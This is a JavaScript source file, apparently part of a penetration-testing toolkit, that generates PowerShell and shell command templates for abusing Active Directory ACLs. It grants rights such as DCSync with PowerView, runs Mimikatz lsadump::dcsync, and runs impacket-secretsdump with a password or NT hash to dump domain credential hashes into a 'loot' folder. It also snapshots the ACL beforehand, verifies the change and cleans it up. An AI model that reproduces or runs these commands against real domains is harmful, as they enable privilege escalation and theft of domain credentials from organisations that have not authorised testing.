const canonicalRight = (value) => {
  const rights = new Map([
    ["all", "All"],
    ["resetpassword", "ResetPassword"],
    ["writemembers", "WriteMembers"],
    ["dcsync", "DCSync"],
  ]);
  return rights.get(String(value || "").trim().toLowerCase()) || "";
};

const credential = "$SecPassword = ConvertTo-SecureString '{{password}}' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('{{domain}}\\{{user}}', $SecPassword)";
const principalSid = "$PrincipalSid = Get-DomainObject -Identity '{{aclPrincipal}}' -Domain '{{domain}}' -Credential $Cred -Properties objectSid | Select-Object -ExpandProperty objectSid";
const aclQuery = "Get-DomainObjectAcl -Identity '{{aclTarget}}' -Domain '{{domain}}' -ResolveGUIDs -Credential $Cred | Where-Object { $_.SecurityIdentifier -eq $PrincipalSid }";
const compareAcl = `$BeforeKeys = @('__ACL_BASELINE__') + @($Before | ForEach-Object { "$($_.ActiveDirectoryRights)|$($_.ObjectAceType)|$($_.AceQualifier)|$($_.IsInherited)" }); $CurrentKeys = @('__ACL_BASELINE__') + @($Current | ForEach-Object { "$($_.ActiveDirectoryRights)|$($_.ObjectAceType)|$($_.AceQualifier)|$($_.IsInherited)" }); $Diff = Compare-Object -ReferenceObject $BeforeKeys -DifferenceObject $CurrentKeys`;

export function buildAclCommands(variables = {}) {
  const right = canonicalRight(variables.aclRights);
  if (!right) {
    return [{
      key: "acl-invalid-right",
      label: "Choose a supported PowerView ACL right",
      value: "Write-Error 'ACL rights must be one of: All, ResetPassword, WriteMembers, DCSync'",
    }];
  }
  const target = String(variables.aclTarget || "selected target").trim();
  const principal = String(variables.aclPrincipal || "selected principal").trim();
  const identity = `${right || "selected right"}: ${principal} -> ${target}`;
  const commands = [
    {
      key: "acl-capture-before",
      label: `Capture current ACL — ${identity}`,
      value: `${credential}; ${principalSid}; $Before = @(${aclQuery}); Export-Clixml -InputObject $Before -Path '.\\acl-before.xml'; $Before | Format-List SecurityIdentifier,ActiveDirectoryRights,ObjectAceType,AceQualifier,IsInherited`,
    },
    {
      key: "acl-grant",
      label: `Grant ${right || "selected right"} — ${principal} on ${target}`,
      value: `${credential}; Add-DomainObjectAcl -Credential $Cred -TargetIdentity '{{aclTarget}}' -TargetDomain '{{domain}}' -PrincipalIdentity '{{aclPrincipal}}' -PrincipalDomain '{{domain}}' -Rights '${right}' -Verbose`,
    },
    {
      key: "acl-verify-grant",
      label: `Review granted ACL change — ${identity}`,
      value: `${credential}; ${principalSid}; $Before = @(Import-Clixml -Path '.\\acl-before.xml'); $Current = @(${aclQuery}); ${compareAcl}; $Current | Format-Table SecurityIdentifier,ObjectAceType,ActiveDirectoryRights,AceQualifier -AutoSize; $Diff | Format-Table -AutoSize; if (-not $Diff) { throw 'No ACL change was detected' }`,
    },
  ];

  if (right === "DCSync") {
    commands.push({
      key: "acl-dcsync-mimikatz",
      label: `Mimikatz DCSync as ${principal}`,
      value: "lsadump::dcsync /domain:{{domain}} /user:{{dcsyncUser}}",
    });

    const samePrincipal = !variables.aclPrincipal || !variables.user
      || String(variables.aclPrincipal).trim().toLowerCase() === String(variables.user).trim().toLowerCase();
    if (samePrincipal) {
      commands.push(
        {
          key: "acl-dcsync-impacket-password",
          label: `Impacket DCSync with ${principal}'s password`,
          value: "mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/dcsync'; impacket-secretsdump -just-dc-user '{{dcsyncUser}}' '{{domain}}/{{user}}:{{password}}@{{rhost}}' | tee '{{workspaceRoot}}/{{targetName}}/loot/dcsync/{{dcsyncUser}}.txt'",
        },
        {
          key: "acl-dcsync-impacket-hash",
          label: `Impacket DCSync with ${principal}'s NT hash`,
          value: "mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/dcsync'; impacket-secretsdump -hashes ':{{hash}}' -just-dc-user '{{dcsyncUser}}' '{{domain}}/{{user}}@{{rhost}}' | tee '{{workspaceRoot}}/{{targetName}}/loot/dcsync/{{dcsyncUser}}.txt'",
        },
      );
    }
  }

  commands.push(
    {
      key: "acl-cleanup",
      label: `Cleanup ${right || "selected right"} — ${principal} on ${target}`,
      value: `${credential}; Remove-DomainObjectAcl -Credential $Cred -TargetIdentity '{{aclTarget}}' -TargetDomain '{{domain}}' -PrincipalIdentity '{{aclPrincipal}}' -PrincipalDomain '{{domain}}' -Rights '${right}' -Verbose`,
    },
    {
      key: "acl-verify-cleanup",
      label: `Verify ACL restoration — ${identity}`,
      value: `${credential}; ${principalSid}; $Before = @(Import-Clixml -Path '.\\acl-before.xml'); $Current = @(${aclQuery}); ${compareAcl}; if ($Diff) { $Diff | Format-Table -AutoSize; throw 'ACL cleanup does not match the captured baseline' } else { 'ACL cleanup matches the captured baseline' }`,
    },
  );

  return commands;
}
